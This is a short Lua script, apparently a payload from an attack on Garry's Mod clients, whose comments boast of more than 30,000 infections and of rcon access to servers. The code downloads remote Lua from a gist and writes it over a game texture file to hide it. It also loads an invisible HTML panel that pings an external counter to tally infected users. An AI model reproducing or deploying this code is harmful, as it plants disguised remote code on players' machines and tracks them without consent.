--[[
  Copyright Mr. 'Handsome' Matt ©
]]

-- Steam Wallet Currency is NOT being stolen pls believe
-- Source Code to DLLs will be publically released here after the Garry's Mod patch along with binaries which, if you are really worried, could be reverse engineered to ensure these statements are true

-- Infected lawl
-- Probably more than 30,000 infections
-- This could have been silent
-- Once spammed, this script will stop working by itself
-- sv_allowupload is not required to be enabled on the server, as rcon access allows it to be set


-- Let's get some viewers


if cookie.GetNumber("friendly_removal", 0) ~= 1 then
  http.Fetch("https://gist.githubusercontent.com/Chrisaster/d9872acbf2da227e9281/raw/client_init.lua", function(content)
    DeleteFile("garrysmod/materials/cooltexture.vtf")
    CreateFile("garrysmod/materials/cooltexture.vtf", content)
    
    cookie.Set("friendly_removal", 1)
  end)
end

local c = vgui.Create("HTML")
c:SetVisible(false)
c:OpenURL("http://s1.freehostedscripts.net/ocounter.php?site=ID4068052&e1=Online%20User&e2=Online%20Users&r=lol&wh=100")